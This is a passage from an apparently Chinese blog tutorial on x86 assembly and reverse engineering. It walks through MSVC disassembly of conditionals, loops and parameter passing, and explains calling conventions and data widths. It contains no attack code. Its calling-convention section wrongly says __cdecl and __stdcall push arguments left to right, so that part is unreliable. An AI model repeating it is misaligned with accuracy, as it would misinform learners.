class="number">0x10</span></span><br><span class="line">			rep stosd</span><br><span class="line">			<span class="comment">//4.函数的功能</span></span><br><span class="line">			mov eax ,dword ptr ds:[ebp+<span class="number">0x8</span>]</span><br><span class="line">			add eax,dowrd ptr ds:[ebp+<span class="number">0xc</span>]</span><br><span class="line">			<span class="comment">//5.恢复现场</span></span><br><span class="line">			pop edi</span><br><span class="line">			pop esi</span><br><span class="line">			pop ebx</span><br><span class="line">			</span><br><span class="line">			mov esp,ebp</span><br><span class="line">			pop ebp</span><br><span class="line">			</span><br><span class="line">			ret</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="调用约定"><a href="#调用约定" class="headerlink" title="调用约定"></a>调用约定</h2><p>__cdecl :从左往右入栈 调用者清理堆栈 <strong>外平栈</strong></p>
<p>__stdcall：从左至右入栈，自身清理堆栈，<strong>内平栈</strong></p>
<p>__fastcall：讲前两个参数用ecx，edx传入，剩下的参数从右往左入栈 ，自身清理堆栈，<strong>内平栈</strong></p>
<h2 id="数据宽度"><a href="#数据宽度" class="headerlink" title="数据宽度"></a>数据宽度</h2><p>主要分为整数类型和浮点数类型</p>
<p>整数类型：</p>
<p><strong>char  8bit  1字节  对应byte</strong></p>
<p><strong>short  16bit 2字节  对应word</strong></p>
<p><strong>int     32bit 4字节  对应dword</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> a = <span class="number">0xaa</span></span><br><span class="line"><span class="type">short</span> b  = <span class="number">0xaa</span></span><br><span class="line"><span class="type">int</span> c = <span class="number">0xaa</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> a = <span class="number">0x12345678</span>   <span class="comment">//实际上是0x78,byte</span></span><br><span class="line"><span class="type">short</span> b = <span class="number">0x12345678</span>   <span class="comment">// 实际上是0x5678,word</span></span><br><span class="line"><span class="type">int</span> c = <span class="number">0x12345678</span></span><br></pre></td></tr></table></figure>

<h2 id="有符号数和无符号数"><a href="#有符号数和无符号数" class="headerlink" title="有符号数和无符号数"></a>有符号数和无符号数</h2><p>在计算机中，数值类型分为整数型或者实数型，其中整形又分为无符号类型或者有符号类型，而实型只有符类型，自发性也分为有符号和无符号，在程序中，用户可以自己定义  是否需要一个非负整数，以char为例，char占一个字节，一个字节&#x3D;8个二进制位，所以它可以表示2^8个数，若想要表示正负号，一般需要一个位标记，如取最高位代表正负号</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">有符号：范围是-128 ~ 127，无符号：0-255</span><br></pre></td></tr></table></figure>

<h2 id="全局变量-局部变量"><a href="#全局变量-局部变量" class="headerlink" title="全局变量&#x2F;局部变量"></a>全局变量&#x2F;局部变量</h2><p>全局变量是整个程序都可以访问的变量，<strong>生存期从程序开始到程序结束</strong>，局部变量存在于模块中（比如某个函数），只有在模块中才可以，生存期从模块开始到模块结束</p>
<p>全局变量分配在全局数据段，在程序开始运行的时候被加载，局部变量则分配在程序的堆栈中。因此，操作系统和编译器可以通过内存分配的位置来区分全局变量和局部变量</p>
<p>全局变量和局部变量的区别是在存储器中位置不同，具体说，全局变量存储在数据段中，局部变量一般在堆栈中</p>
<p><strong>全局变量</strong></p>
<ul>
<li>全局变量的地址在程序编译时就已经确定，如果没有赋初始值则为0</li>
<li>全局变量可以被所有函数修改，存储的值是最后一个函数所附加的值</li>
<li>全局变量占用的内存一直会存在，直到进程结束</li>
<li>反汇编：mov 寄存器 dword ptr ds:[0x12345678]</li>
<li>初始化可以不赋予初值</li>
</ul>
<p><strong>局部变量</strong></p>
<ul>
<li>局部变量没有固定的地址，需要在调用的时候才会在堆栈里面分配内存</li>
<li>局部变量执行完毕之后数据仍然保存在堆栈，但已经没有作用</li>
<li>只能在函数内部使用，不能跨函数调用</li>
<li>反汇编  mov eax ，[esp-0x4]</li>
<li>初始化必须赋值</li>
</ul>
<h2 id="条件语句"><a href="#条件语句" class="headerlink" title="条件语句"></a>条件语句</h2><h3 id="if"><a href="#if" class="headerlink" title="if"></a>if</h3><p>底层反汇编与正向代码逻辑相反，在下面这段码中的0x00B00F57</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00B</span>00F30 <span class="number">55</span> push ebp</span><br><span class="line"><span class="number">00B</span>00F31 <span class="number">8B</span> EC mov ebp,esp</span><br><span class="line"><span class="number">00B</span>00F33 <span class="number">81</span> EC C0 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> sub esp,<span class="number">0</span>C0h</span><br><span class="line"><span class="number">00B</span>00F39 <span class="number">53</span> push ebx</span><br><span class="line"><span class="number">00B</span>00F3A <span class="number">56</span> push esi</span><br><span class="line"><span class="number">00B</span>00F3B <span class="number">57</span> push edi</span><br><span class="line"><span class="number">00B</span>00F3C <span class="number">8B</span> FD mov edi,ebp</span><br><span class="line"><span class="number">00B</span>00F3E <span class="number">33</span> C9 xor ecx,ecx</span><br><span class="line"><span class="number">00B</span>00F40 B8 CC CC CC CC mov eax,<span class="number">0</span>CCCCCCCCh</span><br><span class="line"><span class="number">00B</span>00F45 F3 AB rep stos dword ptr es:[edi]</span><br><span class="line"><span class="number">00B</span>00F47 B9 F3 <span class="number">80</span> B6 <span class="number">00</span> mov ecx,offset _8C0D0233_Project1@cpp</span><br><span class="line">(<span class="number">0B</span>680F3h)</span><br><span class="line"><span class="number">00B</span>00F4C E8 D9 <span class="number">1B</span> FF FF call @__CheckForDebuggerJustMyCode@<span class="number">4</span></span><br><span class="line">(<span class="number">0</span>AF2B2Ah)</span><br><span class="line"><span class="number">00B</span>00F51 <span class="number">8B</span> <span class="number">45</span> <span class="number">08</span> mov eax,dword ptr [a]</span><br><span class="line"><span class="number">00B</span>00F54 <span class="number">3B</span> <span class="number">45</span> <span class="number">0</span>C cmp eax,dword ptr [b]</span><br><span class="line"><span class="number">00B</span>00F57 <span class="number">7</span>E <span class="number">08</span> jle __$EncStackInitStart+<span class="number">25</span>h (<span class="number">0B</span>00F61h)<span class="comment">//这里不满足if的条件就跳走，否则顺序执行</span></span><br><span class="line"><span class="number">00B</span>00F59 <span class="number">8B</span> <span class="number">45</span> <span class="number">08</span> mov eax,dword ptr [a]</span><br><span class="line"><span class="number">00B</span>00F5C A3 <span class="number">10</span> <span class="number">4F</span> B6 <span class="number">00</span> mov dword ptr [x (<span class="number">0B</span>64F10h)],eax</span><br><span class="line"><span class="number">00B</span>00F61 <span class="number">5F</span> pop edi</span><br><span class="line"><span class="number">00B</span>00F62 <span class="number">5</span>E pop esi</span><br><span class="line"><span class="number">00B</span>00F63 <span class="number">5B</span> pop ebx</span><br><span class="line"><span class="number">00B</span>00F64 <span class="number">81</span> C4 C0 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> add esp,<span class="number">0</span>C0h</span><br><span class="line"><span class="number">00B</span>00F6A <span class="number">3B</span> EC cmp ebp,esp</span><br><span class="line"><span class="number">00B</span>00F6C E8 <span class="number">2</span>A <span class="number">0F</span> FF FF call __RTC_CheckEsp (<span class="number">0</span>AF1E9Bh)</span><br><span class="line"><span class="number">00B</span>00F71 <span class="number">8B</span> E5 mov esp,ebp</span><br><span class="line"><span class="number">00B</span>00F73 <span class="number">5</span>D pop ebp</span><br><span class="line"><span class="number">00B</span>00F74 C3 ret</span><br></pre></td></tr></table></figure>

<h3 id="if-else"><a href="#if-else" class="headerlink" title="if..else"></a>if..else</h3><p>底层逻辑反汇编和正向代码逻辑相反，有if直接跳走，else顺序执行</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span>8B66D0 <span class="number">55</span> push ebp</span><br><span class="line"><span class="number">00</span>8B66D1 <span class="number">8</span>B EC mov ebp,esp</span><br><span class="line"><span class="number">00</span>8B66D3 <span class="number">81</span> EC C0 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> sub esp,<span class="number">0</span>C0h</span><br><span class="line"><span class="number">00</span>8B66D9 <span class="number">53</span> push ebx</span><br><span class="line"><span class="number">00</span>8B66DA <span class="number">56</span> push esi</span><br><span class="line"><span class="number">00</span>8B66DB <span class="number">57</span> push edi</span><br><span class="line"><span class="number">00</span>8B66DC <span class="number">8</span>B FD mov edi,ebp</span><br><span class="line"><span class="number">00</span>8B66DE <span class="number">33</span> C9 <span class="keyword">xor</span> ecx,ecx</span><br><span class="line"><span class="number">00</span>8B<span class="number">66E0</span> B8 CC CC CC CC mov eax,<span class="number">0</span>CCCCCCCCh</span><br><span class="line"><span class="number">00</span>8B<span class="number">66E5</span> F3 AB rep stos dword ptr es:[edi]</span><br><span class="line"><span class="number">00</span>8B<span class="number">66E7</span> B9 F3 <span class="number">80</span> <span class="number">92</span> <span class="number">00</span> mov ecx,offset _8C0D0233_Project1@<span class="built_in">cpp</span></span><br><span class="line">(<span class="number">0</span>9280F3h)</span><br><span class="line"><span class="number">00</span>8B66EC E8 <span class="number">39</span> C4 FF FF call @__CheckForDebuggerJustMyCode@<span class="number">4</span></span><br><span class="line">(<span class="number">0</span>8B2B2Ah)</span><br><span class="line"><span class="number">00</span>8B66F1 <span class="number">8</span>B <span class="number">45</span> <span class="number">0</span>8 mov eax,dword ptr [a]</span><br><span class="line"><span class="number">00</span>8B66F4 <span class="number">3</span>B <span class="number">45</span> <span class="number">0</span>C cmp eax,dword ptr [b]</span><br><span class="line"><span class="number">00</span>8B66F7 <span class="number">7</span>E <span class="number">0</span>A jle __$EncStackInitStart<span class="number">+27</span>h (<span class="number">0</span>8B6703h)</span><br><span class="line"><span class="number">00</span>8B66F9 <span class="number">8</span>B <span class="number">45</span> <span class="number">0</span>8 mov eax,dword ptr [a]</span><br><span class="line"><span class="number">00</span>8B66FC A3 <span class="number">10</span> <span class="number">4</span>F <span class="number">92</span> <span class="number">00</span> mov dword ptr [<span class="built_in">x</span> (<span class="number">0</span>924F10h)],eax</span><br><span class="line"><span class="number">00</span>8B6701 EB <span class="number">0</span>8 jmp __$EncStackInitStart<span class="number">+2</span>Fh (<span class="number">0</span>8B670Bh)</span><br><span class="line"><span class="number">00</span>8B6703 <span class="number">8</span>B <span class="number">45</span> <span class="number">0</span>C mov eax,dword ptr [b]</span><br><span class="line"><span class="number">00</span>8B6706 A3 <span class="number">10</span> <span class="number">4</span>F <span class="number">92</span> <span class="number">00</span> mov dword ptr [<span class="built_in">x</span> (<span class="number">0</span>924F10h)],eax</span><br><span class="line"><span class="number">00</span>8B670B <span class="number">5</span>F pop edi</span><br><span class="line"><span class="number">00</span>8B670C <span class="number">5</span>E pop esi</span><br><span class="line"><span class="number">00</span>8B670D <span class="number">5</span>B pop ebx</span><br><span class="line"><span class="number">00</span>8B670E <span class="number">81</span> C4 C0 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> add esp,<span class="number">0</span>C0h</span><br><span class="line"><span class="number">00</span>8B6714 <span class="number">3</span>B EC cmp ebp,esp</span><br><span class="line"><span class="number">00</span>8B6716 E8 <span class="number">80</span> B7 FF FF call __RTC_CheckEsp (<span class="number">0</span>8B<span class="number">1E9</span>Bh)</span><br><span class="line"><span class="number">00</span>8B671B <span class="number">8</span>B E5 mov esp,ebp</span><br><span class="line"><span class="number">00</span>8B671D <span class="number">5</span>D pop ebp</span><br><span class="line"><span class="number">00</span>8B671E C3 ret</span><br></pre></td></tr></table></figure>

<h3 id="while"><a href="#while" class="headerlink" title="while"></a>while</h3><p>只要条件判断为真，则一直执行循环</p>
<p>底层反汇编与正向代码逻辑相反，有回跳就有循环</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">000</span>966D0 <span class="number">55</span> push ebp</span><br><span class="line"><span class="number">000</span>966D1 <span class="number">8</span>B EC mov ebp,esp</span><br><span class="line"><span class="number">000</span>966D3 <span class="number">81</span> EC C0 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> sub esp,<span class="number">0</span>C0h</span><br><span class="line"><span class="number">000</span>966D9 <span class="number">53</span> push ebx</span><br><span class="line"><span class="number">000</span>966DA <span class="number">56</span> push esi</span><br><span class="line"><span class="number">000</span>966DB <span class="number">57</span> push edi</span><br><span class="line"><span class="number">000</span>966DC <span class="number">8</span>B FD mov edi,ebp</span><br><span class="line"><span class="number">000</span>966DE <span class="number">33</span> C9 <span class="keyword">xor</span> ecx,ecx</span><br><span class="line"><span class="number">000966E0</span> B8 CC CC CC CC mov eax,<span class="number">0</span>CCCCCCCCh</span><br><span class="line"><span class="number">000966E5</span> F3 AB rep stos dword ptr es:[edi]</span><br><span class="line"><span class="number">000966E7</span> B9 F3 <span class="number">80</span> <span class="number">10</span> <span class="number">00</span> mov ecx,offset _8C0D0233_Project1@<span class="built_in">cpp</span></span><br><span class="line">(<span class="number">010</span>80F3h)</span><br><span class="line"><span class="number">000</span>966EC E8 <span class="number">39</span> C4 FF FF call @__CheckForDebuggerJustMyCode@<span class="number">4</span></span><br><span class="line">(<span class="number">0</span>92B2Ah)</span><br><span class="line"><span class="number">000</span>966F1 <span class="number">8</span>B <span class="number">45</span> <span class="number">0</span>8 mov eax,dword ptr [a]</span><br><span class="line"><span class="number">000</span>966F4 <span class="number">3</span>B <span class="number">45</span> <span class="number">0</span>C cmp eax,dword ptr [b]</span><br><span class="line"><span class="number">000</span>966F7 <span class="number">7</span>E <span class="number">13</span> jle __$EncStackInitStart<span class="number">+30</span>h (<span class="number">0</span>9670Ch)</span><br><span class="line"><span class="number">000</span>966F9 <span class="number">8</span>B <span class="number">45</span> <span class="number">0</span>C mov eax,dword ptr [b]</span><br><span class="line"><span class="number">000</span>966FC <span class="number">83</span> C0 <span class="number">01</span> add eax,<span class="number">1</span></span><br><span class="line"><span class="number">000</span>966FF <span class="number">89</span> <span class="number">45</span> <span class="number">0</span>C mov dword ptr [b],eax</span><br><span class="line"><span class="number">000</span>96702 <span class="number">8</span>B <span class="number">45</span> <span class="number">0</span>8 mov eax,dword ptr [a]</span><br><span class="line"><span class="number">000</span>96705 A3 <span class="number">10</span> <span class="number">4</span>F <span class="number">10</span> <span class="number">00</span> mov dword ptr [<span class="built_in">x</span> (<span class="number">0104</span>F10h)],eax</span><br><span class="line"><span class="number">000</span>9670A EB E5 jmp __$EncStackInitStart<span class="number">+15</span>h (<span class="number">0</span>966F1h)<span class="comment">//回跳</span></span><br><span class="line"><span class="number">000</span>9670C <span class="number">5</span>F pop edi</span><br><span class="line"><span class="number">000</span>9670D <span class="number">5</span>E pop esi</span><br><span class="line"><span class="number">000</span>9670E <span class="number">5</span>B pop ebx</span><br><span class="line"><span class="number">000</span>9670F <span class="number">81</span> C4 C0 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> add esp,<span class="number">0</span>C0h</span><br><span class="line"><span class="number">000</span>96715 <span class="number">3</span>B EC cmp ebp,esp</span><br><span class="line"><span class="number">000</span>96717 E8 <span class="number">7</span>F B7 FF FF call __RTC_CheckEsp (<span class="number">091E9</span>Bh)</span><br><span class="line"><span class="number">000</span>9671C <span class="number">8</span>B E5 mov esp,ebp</span><br><span class="line"><span class="number">000</span>9671E <span class="number">5</span>D pop ebp</span><br><span class="line"><span class="number">000</span>9671F C3 ret</span><br></pre></td></tr></table></figure>

<h3 id="do…while"><a href="#do…while" class="headerlink" title="do…while"></a>do…while</h3><p>与while的区别是至少执行一次循环体</p>
<p>与while的区别就是先判断再执行还是先执行在判断</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span>9366D0 <span class="number">55</span> push ebp</span><br><span class="line"><span class="number">00</span>9366D1 <span class="number">8</span>B EC mov ebp,esp</span><br><span class="line"><span class="number">00</span>9366D3 <span class="number">81</span> EC C0 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> sub esp,<span class="number">0</span>C0h</span><br><span class="line"><span class="number">00</span>9366D9 <span class="number">53</span> push ebx</span><br><span class="line"><span class="number">00</span>9366DA <span class="number">56</span> push esi</span><br><span class="line"><span class="number">00</span>9366DB <span class="number">57</span> push edi</span><br><span class="line"><span class="number">00</span>9366DC <span class="number">8</span>B FD mov edi,ebp</span><br><span class="line"><span class="number">00</span>9366DE <span class="number">33</span> C9 <span class="keyword">xor</span> ecx,ecx</span><br><span class="line"><span class="number">009366E0</span> B8 CC CC CC CC mov eax,<span class="number">0</span>CCCCCCCCh</span><br><span class="line"><span class="number">009366E5</span> F3 AB rep stos dword ptr es:[edi]</span><br><span class="line"><span class="number">009366E7</span> B9 F3 <span class="number">80</span> <span class="number">9</span>A <span class="number">00</span> mov ecx,offset _8C0D0233_Project1@<span class="built_in">cpp</span></span><br><span class="line">(<span class="number">0</span>9A80F3h)</span><br><span class="line"><span class="number">00</span>9366EC E8 <span class="number">39</span> C4 FF FF call @__CheckForDebuggerJustMyCode@<span class="number">4</span></span><br><span class="line">(<span class="number">0</span>932B2Ah)</span><br><span class="line"><span class="number">00</span>9366F1 <span class="number">8</span>B <span class="number">45</span> <span class="number">0</span>8 mov eax,dword ptr [a]</span><br><span class="line"><span class="number">00</span>9366F4 <span class="number">83</span> C0 <span class="number">01</span> add eax,<span class="number">1</span></span><br><span class="line"><span class="number">00</span>9366F7 <span class="number">89</span> <span class="number">45</span> <span class="number">0</span>8 mov dword ptr [a],eax</span><br><span class="line"><span class="number">00</span>9366FA <span class="number">8</span>B <span class="number">45</span> <span class="number">0</span>8 mov eax,dword ptr [a]</span><br><span class="line"><span class="number">00</span>9366FD A3 <span class="number">10</span> <span class="number">4</span>F <span class="number">9</span>A <span class="number">00</span> mov dword ptr [<span class="built_in">x</span> (<span class="number">0</span>9A4F10h)],eax</span><br><span class="line"><span class="number">00</span>936702 <span class="number">8</span>B <span class="number">45</span> <span class="number">0</span>8 mov eax,dword ptr [a]</span><br><span class="line"><span class="number">00</span>936705 <span class="number">3</span>B <span class="number">45</span> <span class="number">0</span>C cmp eax,dword ptr [b]</span><br><span class="line"><span class="number">00</span>936708 <span class="number">7</span>C E7 jl __$EncStackInitStart<span class="number">+15</span>h (<span class="number">0</span>9366F1h)</span><br><span class="line"><span class="number">00</span>93670A A1 <span class="number">10</span> <span class="number">4</span>F <span class="number">9</span>A <span class="number">00</span> mov eax,dword ptr [<span class="built_in">x</span> (<span class="number">0</span>9A4F10h)]</span><br><span class="line"><span class="number">00</span>93670F <span class="number">50</span> push eax</span><br><span class="line"><span class="number">00</span>936710 <span class="number">68</span> <span class="number">94</span> <span class="number">93</span> <span class="number">99</span> <span class="number">00</span> push offset string <span class="string">&quot;%d&quot;</span> (<span class="number">0</span>999394h)</span><br><span class="line"><span class="number">00</span>936715 E8 <span class="number">57</span> CD FF FF call _printf (<span class="number">0</span>933471h)</span><br><span class="line"><span class="number">00</span>93671A <span class="number">83</span> C4 <span class="number">0</span>8 add esp,<span class="number">8</span></span><br><span class="line"><span class="number">00</span>93671D <span class="number">5</span>F pop edi</span><br><span class="line"><span class="number">00</span>93671E <span class="number">5</span>E pop esi</span><br><span class="line"><span class="number">00</span>93671F <span class="number">5</span>B pop ebx</span><br><span class="line"><span class="number">00</span>936720 <span class="number">81</span> C4 C0 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> add esp,<span class="number">0</span>C0h</span><br><span class="line"><span class="number">00</span>936726 <span class="number">3</span>B EC cmp ebp,esp</span><br><span class="line"><span class="number">00</span>936728 E8 <span class="number">6</span>E B7 FF FF call __RTC_CheckEsp (<span class="number">0931E9</span>Bh)</span><br><span class="line"><span class="number">00</span>93672D <span class="number">8</span>B E5 mov esp,ebp</span><br><span class="line"><span class="number">00</span>93672F <span class="number">5</span>D pop ebp</span><br><span class="line"><span class="number">00</span>936730 C3 ret</span><br></pre></td></tr></table></figure>

<h3 id="for-循环"><a href="#for-循环" class="headerlink" title="for 循环"></a>for 循环</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++)</span><br><span class="line"><span class="number">00</span>C21855 mov dword ptr [ebp<span class="number">-8</span>],<span class="number">0</span></span><br><span class="line"><span class="number">00</span>C2185C jmp __$EncStackInitStart+<span class="number">2B</span>h (<span class="number">0</span>C21867h)</span><br><span class="line"><span class="number">00</span>C2185E mov eax,dword ptr [ebp<span class="number">-8</span>]</span><br><span class="line"><span class="number">00</span>C21861 add eax,<span class="number">1</span></span><br><span class="line"><span class="number">00</span>C21864 mov dword ptr [ebp<span class="number">-8</span>],eax</span><br><span class="line"><span class="number">00</span>C21867 cmp dword ptr [ebp<span class="number">-8</span>],<span class="number">64</span>h</span><br><span class="line"><span class="number">00</span>C2186B jge __$EncStackInitStart+<span class="number">40</span>h (<span class="number">0</span>C2187Ch)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line"><span class="number">00</span>C2186D push offset <span class="built_in">string</span> <span class="string">&quot;hello&quot;</span> (<span class="number">0</span>C27BD0h)</span><br><span class="line"><span class="number">00</span>C21872 call _printf (<span class="number">0</span>C210D7h)</span><br><span class="line"><span class="number">00</span>C21877 add esp,<span class="number">4</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">00</span>C2187A jmp __$EncStackInitStart+<span class="number">22</span>h (<span class="number">0</span>C2185Eh)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="参数的传递"><a href="#参数的传递" class="headerlink" title="参数的传递"></a>参数的传递</h2><p>参数传递的本质：将上层函数的变量，或者表达式的值复制一份，传递给下层函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> <span class="title function_">function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> i = function();</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">function</span><span class="params">(<span class="type">int</span> x)</span> <span class="comment">// [ebp+8] 参数</span></span><br><span class="line">&#123;</span><br><span class="line">x = x + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> x = <span class="number">2</span>; <span class="comment">// [ebp-4] = 2 栈里面的缓冲区</span></span><br><span class="line">function(x);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,x);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对应的反汇编</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">13</span>: <span class="type">int</span> x = <span class="number">2</span>; <span class="comment">// [ebp-4] = 2</span></span><br><span class="line"><span class="number">00401078</span> mov dword ptr [ebp<span class="number">-4</span>],<span class="number">2</span></span><br><span class="line"><span class="number">14</span>:</span><br><span class="line"><span class="number">15</span>: function(x);</span><br><span class="line"><span class="number">0040107F</span> mov eax,dword ptr [ebp<span class="number">-4</span>]</span><br><span class="line"><span class="number">00401082</span> push eax</span><br><span class="line"><span class="number">00401083</span> call @ILT+<span class="number">0</span>(function) (<span class="number">00401005</span>)</span><br><span class="line"><span class="number">8</span>: x = x + <span class="number">1</span>;</span><br><span class="line"><span class="number">00401038</span> mov eax,dword ptr [ebp+<span class="number">8</span>]</span><br><span class="line"><span class="number">0040103B</span> add eax,<span class="number">1</span></span><br><span class="line"><span class="number">0040103</span>E mov dword ptr [ebp+<span class="number">8</span>],eax</span><br><span class="line"><span class="number">9</span>: &#125;</span><br><span class="line"><span class="number">00401041</span> pop edi</span><br><span class="line"><span class="number">00401042</span> pop esi</span><br><span class="line"><span class="number">00401043</span> pop ebx</span><br><span class="line"><span class="number">00401044</span> mov esp,ebp</span><br><span class="line"><span class="number">00401046</span> pop ebp</span><br><span class="line"><span class="number">00401047</span> ret</span><br><span class="line"><span class="number">00401088</span> add esp,<span class="number">4</span></span><br><span class="line"><span class="number">16</span>:</span><br><span class="line"><span class="number">17</span>: <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, x);</span><br><span class="line"><span class="number">0040108B</span> mov ecx,dword ptr [ebp<span class="number">-4</span>]</span><br><span class="line"><span class="number">0040108</span>E push ecx</span><br><span class="line"><span class="number">0040108F</span> push offset <span class="built_in">string</span> <span class="string">&quot;%d\n&quot;</span> (<span class="number">0042201</span>c)</span><br><span class="line"><span class="number">00401094</span> call <span class="title function_">printf</span> <span class="params">(<span class="number">004010</span>d0)</span></span><br><span class="line">00401099 add esp,8</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h2><p>数组允许定义可存储相同类型数据项的变量，结构体是C语言中另一种用户自定义的可用的数据类型</p>
